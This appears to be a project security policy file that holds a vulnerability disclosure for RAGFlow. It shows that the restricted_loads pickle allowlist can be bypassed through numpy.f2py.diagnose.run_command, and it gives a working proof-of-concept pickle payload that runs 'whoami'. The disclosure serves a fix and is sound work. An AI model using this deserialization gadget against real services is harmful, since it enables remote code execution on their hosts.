# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| <=0.7.0   | :white_check_mark: |

## Reporting a Vulnerability

### Branch name

main

### Actual behavior

The restricted_loads function at [api/utils/__init__.py#L215](https://github.com/infiniflow/ragflow/blob/main/api/utils/__init__.py#L215) is still vulnerable leading via code execution.
The main reason is that numpy module has a numpy.f2py.diagnose.run_command function directly execute commands, but the restricted_loads function allows users import functions in module numpy.


### Steps to reproduce


**ragflow_patch.py**

```py
import builtins
import io
import pickle

safe_module = {
    'numpy',
    'rag_flow'
}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        import importlib
        if module.split('.')[0] in safe_module:
            _module = importlib.import_module(module)
            return getattr(_module, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))


def restricted_loads(src):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(src)).load()
```
Then, **PoC.py**
```py
import pickle
from ragflow_patch import restricted_loads
class Exploit:
     def __reduce__(self):
         import numpy.f2py.diagnose
         return numpy.f2py.diagnose.run_command, ('whoami', )

Payload=pickle.dumps(Exploit())
restricted_loads(Payload)
```
**Result**
![image](https://github.com/infiniflow/ragflow/assets/85293841/8e5ed255-2e84-466c-bce4-776f7e4401e8)


### Additional information

#### How to prevent?
Strictly filter the module and name before calling with getattr function.
